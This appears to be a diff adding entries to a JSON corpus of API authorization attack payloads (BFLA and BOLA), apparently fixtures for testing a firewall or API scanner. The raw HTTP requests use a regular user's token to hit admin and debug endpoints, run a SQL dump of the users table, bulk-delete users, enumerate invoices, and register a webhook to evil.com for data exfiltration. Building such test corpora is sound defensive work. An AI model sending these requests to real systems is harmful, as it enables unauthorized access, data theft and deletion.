+  {
+      "id": "BFLA-EXPORT-002",
+      "payload": "GET /api/admin/reports/financial HTTP/1.1\r\nHost: target.com\r\nAuthorization: Bearer regular_user_token\r\n\r\n",
+      "tags": ["bfla", "report", "financial", "critical"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "BFLA - Accessing financial reports",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "BFLA-CONFIG-001",
+      "payload": "GET /api/admin/config HTTP/1.1\r\nHost: target.com\r\nAuthorization: Bearer regular_user_token\r\n\r\n",
+      "tags": ["bfla", "config", "sensitive", "critical"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "BFLA - Accessing system configuration",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "BFLA-CONFIG-002",
+      "payload": "PUT /api/admin/config HTTP/1.1\r\nHost: target.com\r\nAuthorization: Bearer regular_user_token\r\nContent-Type: application/json\r\n\r\n{\"feature_flag\":\"allow_public_signup\",\"value\":true}",
+      "tags": ["bfla", "config-modify", "feature-flag", "critical"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "BFLA - Modifying feature flags",
+      "destructive": true,
+      "category": "Logic"
+  },
+  {
+      "id": "BFLA-WEBHOOK-001",
+      "payload": "POST /api/admin/webhooks HTTP/1.1\r\nHost: target.com\r\nAuthorization: Bearer regular_user_token\r\nContent-Type: application/json\r\n\r\n{\"url\":\"https://evil.com/exfil\",\"events\":[\"user.created\",\"order.completed\"]}",
+      "tags": ["bfla", "webhook", "data-exfil", "critical"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "BFLA - Creating webhook for data exfiltration",
+      "destructive": true,
+      "category": "Logic"
+  },
+  {
+      "id": "BFLA-DEBUG-001",
+      "payload": "GET /api/debug/info HTTP/1.1\r\nHost: target.com\r\nAuthorization: Bearer regular_user_token\r\n\r\n",
+      "tags": ["bfla", "debug", "info-disclosure", "high"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "BFLA - Accessing debug information",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "BFLA-DEBUG-002",
+      "payload": "POST /api/debug/sql HTTP/1.1\r\nHost: target.com\r\nAuthorization: Bearer regular_user_token\r\nContent-Type: application/json\r\n\r\n{\"query\":\"SELECT * FROM users\"}",
+      "tags": ["bfla", "debug", "sql-console", "critical"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "BFLA - Accessing debug SQL console",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "BOLA-VERSION-001",
+      "payload": "GET /api/v1/users/1 HTTP/1.1\r\nHost: target.com\r\nAuthorization: Bearer attacker_token\r\n\r\n",
+      "tags": ["bola", "api-version", "v1", "high"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "BOLA - Testing old API version for weaker auth",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "BOLA-VERSION-002",
+      "payload": "GET /api/beta/users/1 HTTP/1.1\r\nHost: target.com\r\nAuthorization: Bearer attacker_token\r\n\r\n",
+      "tags": ["bola", "api-version", "beta", "high"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "BOLA - Testing beta API for weaker auth",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "BOLA-VERSION-003",
+      "payload": "GET /api/internal/users/1 HTTP/1.1\r\nHost: target.com\r\nAuthorization: Bearer attacker_token\r\n\r\n",
+      "tags": ["bola", "internal-api", "critical"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "BOLA - Testing internal API endpoint",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "BOLA-SHARE-001",
+      "payload": "GET /api/shares/abc123 HTTP/1.1\r\nHost: target.com\r\n\r\n",
+      "tags": ["bola", "share-token", "guessable", "high"],
+      "expected_block": false,
+      "severity_hint": "High",
+      "notes": "BOLA - Accessing shared resource via weak token",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "BOLA-SHARE-002",
+      "payload": "GET /api/public-links/12345 HTTP/1.1\r\nHost: target.com\r\n\r\n",
+      "tags": ["bola", "public-link", "sequential", "high"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "BOLA - Sequential public link enumeration",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "BFLA-BULK-001",
+      "payload": "POST /api/admin/users/bulk-delete HTTP/1.1\r\nHost: target.com\r\nAuthorization: Bearer regular_user_token\r\nContent-Type: application/json\r\n\r\n{\"user_ids\":[1,2,3,4,5]}",
+      "tags": ["bfla", "bulk-operation", "mass-delete", "critical"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "BFLA - Bulk delete operation (admin function)",
+      "destructive": true,
+      "category": "Logic"
+  },
+  {
+      "id": "BFLA-BULK-002",
+      "payload": "POST /api/admin/users/bulk-update HTTP/1.1\r\nHost: target.com\r\nAuthorization: Bearer regular_user_token\r\nContent-Type: application/json\r\n\r\n{\"user_ids\":[1,2,3],\"update\":{\"role\":\"guest\"}}",
+      "tags": ["bfla", "bulk-operation", "mass-update", "critical"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "BFLA - Bulk role update (admin function)",
+      "destructive": true,
+      "category": "Logic"
+  },
+  {
+      "id": "BOLA-REFERENCE-001",
+      "payload": "GET /api/documents?ref=DOC-2024-0001 HTTP/1.1\r\nHost: target.com\r\nAuthorization: Bearer attacker_token\r\n\r\n",
+      "tags": ["bola", "reference-number", "sequential", "high"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "BOLA - Sequential reference number access",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "BOLA-REFERENCE-002",
+      "payload": "GET /api/invoices/INV-2024-00001 HTTP/1.1\r\nHost: target.com\r\nAuthorization: Bearer attacker_token\r\n\r\n",
+      "tags": ["bola", "invoice-number", "financial", "critical"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "BOLA - Invoice access via reference number",
+      "destructive": false,
+      "category": "Logic"
+  }
+]
